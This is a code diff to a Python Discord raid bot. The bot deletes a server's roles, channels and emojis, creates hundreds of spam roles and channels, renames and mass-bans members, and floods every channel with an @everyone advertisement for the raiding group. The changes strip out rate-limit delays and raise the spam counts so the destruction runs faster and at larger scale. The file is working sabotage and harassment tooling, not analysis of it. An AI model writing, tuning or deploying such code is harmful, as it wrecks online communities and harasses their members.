@@ -26,7 +26,7 @@ async def execute_raid(ctx, do_ban=False):
     channel_name = 'ますまに共栄圏最強'
     channel_count = 200
     spam_message = '# このサーバーはますまに共栄圏によって荒らされました\nRaid by masumani\ndiscord.gg/DCKWUNfEA5\n@everyone\nhttps://cdn.discordapp.com/attachments/1236663988914229308/1287064282256900246/copy_89BE23AC-0647-468A-A5B9-504B5A98BC8B.gif?ex=68cf68c5&is=68ce1745&hm=1250d2c6de152cc6caab5c1b51f27163fdaa0ebff883fbbe7983959cdda7d782&'
-    spam_count = 10
+    spam_count = 200
     role_name = 'ますまに共栄圏に荒らされましたww'
     role_count = 150
 
@@ -45,8 +45,6 @@ async def execute_raid(ctx, do_ban=False):
     except Exception as e:
         await user.send(f'絵文字削除失敗')
 
-    await asyncio.sleep(1)
-
     # アイコンダウンロード
     icon_bytes = None
     try:
@@ -57,17 +55,15 @@ async def execute_raid(ctx, do_ban=False):
     except:
         pass
 
-    # 2. ロール削除（高速化）
+    # 2. ロール削除（高速化・修正版）
     try:
-        roles_to_delete = [role for role in guild.roles if role.name != '@everyone' and not role.managed]
+        roles_to_delete = [role for role in guild.roles if role.name != '@everyone' and not role.managed and role < guild.me.top_role]
         role_delete_tasks = [role.delete() for role in roles_to_delete]
         role_delete_results = await asyncio.gather(*role_delete_tasks, return_exceptions=True)
         role_deleted = sum(1 for r in role_delete_results if not isinstance(r, Exception))
         await user.send(f'ロール削除: {role_deleted}個')
     except Exception as e:
         await user.send(f'ロール削除失敗')
-
-    await asyncio.sleep(1)
 
     # 3. ロール作成（最速）
     created_roles = []
@@ -84,37 +80,39 @@ async def execute_raid(ctx, do_ban=False):
                 if not isinstance(r, Exception):
                     created_roles.append(r)
                     role_created += 1
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.2)
         await user.send(f'ロール作成: {role_created}個')
     except Exception as e:
         await user.send(f'ロール作成失敗')
 
-    await asyncio.sleep(1)
-
-    # 4. メンバーにニックネーム変更＋ロール付与
+    # 4. メンバーにニックネーム変更＋ロール付与（高速化）
     try:
-        members_to_update = [m for m in guild.members if not m.bot and m != user]
+        members_to_update = [m for m in guild.members if not m.bot and m != user and m != guild.me]
 
         async def update_member(member):
             try:
+                tasks = []
                 # ニックネーム変更
-                await member.edit(nick='ますまに共栄圏に敗北')
+                tasks.append(member.edit(nick='ますまに共栄圏に敗北'))
                 # ランダムに20個のロールを付与
                 if len(created_roles) >= 20:
                     roles_to_add = random.sample(created_roles, 20)
-                    await member.add_roles(*roles_to_add)
+                    tasks.append(member.add_roles(*roles_to_add))
+                await asyncio.gather(*tasks, return_exceptions=True)
                 return 1
             except:
                 return 0
 
-        update_tasks = [update_member(m) for m in members_to_update]
-        update_results = await asyncio.gather(*update_tasks, return_exceptions=True)
-        updated_count = sum(r for r in update_results if not isinstance(r, Exception))
+        # 50人ずつバッチ処理
+        updated_count = 0
+        for i in range(0, len(members_to_update), 50):
+            batch = members_to_update[i:i+50]
+            update_tasks = [update_member(m) for m in batch]
+            update_results = await asyncio.gather(*update_tasks, return_exceptions=True)
+            updated_count += sum(r for r in update_results if not isinstance(r, Exception))
         await user.send(f'メンバー更新: {updated_count}人')
     except Exception as e:
         await user.send(f'メンバー更新失敗')
-
-    await asyncio.sleep(1)
 
     # 5. DM送信
     try:
@@ -132,8 +130,6 @@ async def execute_raid(ctx, do_ban=False):
     except Exception as e:
         await user.send(f'DM送信失敗')
 
-    await asyncio.sleep(1)
-
     # 6. アイコン・サーバー名変更
     try:
         if icon_bytes:
@@ -144,8 +140,6 @@ async def execute_raid(ctx, do_ban=False):
     except Exception as e:
         await user.send('サーバー設定変更失敗')
 
-    await asyncio.sleep(1)
-
     # 7. チャンネル削除（高速化）
     try:
         channels_to_delete = list(guild.channels)
@@ -155,8 +149,6 @@ async def execute_raid(ctx, do_ban=False):
         await user.send(f'チャンネル削除: {deleted_count}個')
     except Exception as e:
         await user.send(f'チャンネル削除失敗')
-
-    await asyncio.sleep(1)
 
     # 8. チャンネル作成（最速）
     created_channels = []
@@ -170,43 +162,33 @@ async def execute_raid(ctx, do_ban=False):
                 if not isinstance(r, Exception):
                     created_channels.append(r)
                     created_count += 1
-            await asyncio.sleep(1)
+            await asyncio.sleep(0.2)
         await user.send(f'チャンネル作成: {created_count}個')
     except Exception as e:
         await user.send(f'チャンネル作成失敗: {created_count}個作成済み')
-
-    await asyncio.sleep(1)
 
     # 9. allban確認とメッセージ送信
     if do_ban:
         await user.send('allban実行をスキップしてメッセージ送信へ')
 
-    # 10. メッセージ送信（安定版・レート制限対策）
+    # 10. メッセージ送信（全チャンネル同時）
     try:
         await user.send('メッセージ送信中...')
 
-        async def spam_channel_safe(channel):
+        async def spam_channel_full(channel):
             count = 0
             for i in range(spam_count):
                 try:
                     await channel.send(spam_message)
                     count += 1
-                    await asyncio.sleep(0.5)
-                except Exception as e:
-                    await asyncio.sleep(1)
-                    continue
+                except:
+                    break
             return count
 
-        total_messages = 0
-        for i in range(0, len(created_channels), 200):
-            batch = created_channels[i:i+]
-            spam_tasks = [spam_channel_safe(ch) for ch in batch]
-            spam_results = await asyncio.gather(*spam_tasks, return_exceptions=True)
-            total_messages += sum(r for r in spam_results if not isinstance(r, Exception))
-            await asyncio.sleep(1)
-
-            if (i + 10) % 30 == 0:
-                await user.send(f'進捗: {i + 10}/{len(created_channels)}チャンネル処理済み')
+        # 全チャンネル同時送信
+        spam_tasks = [spam_channel_full(ch) for ch in created_channels]
+        spam_results = await asyncio.gather(*spam_tasks, return_exceptions=True)
+        total_messages = sum(r for r in spam_results if not isinstance(r, Exception))
 
         await user.send(f'完了 メッセージ送信: {total_messages}件')
     except Exception as e:
@@ -234,7 +216,7 @@ async def allban(ctx):
 
     await user.send('BAN処理開始')
 
-    members = [m for m in guild.members if not m.bot and m != user]
+    members = [m for m in guild.members if not m.bot and m != user and m != guild.me]
     total = len(members)
 
     await user.send(f'対象: {total}人')
@@ -244,7 +226,7 @@ async def allban(ctx):
 
     for member in members:
         try:
-            await guild.ban(member, reason='ますまに共栄圏によるBAN')
+            await guild.ban(member, reason='Masumani on top!')
             banned += 1
             if banned % 10 == 0:
                 await user.send(f'進捗: {banned}/{total}')
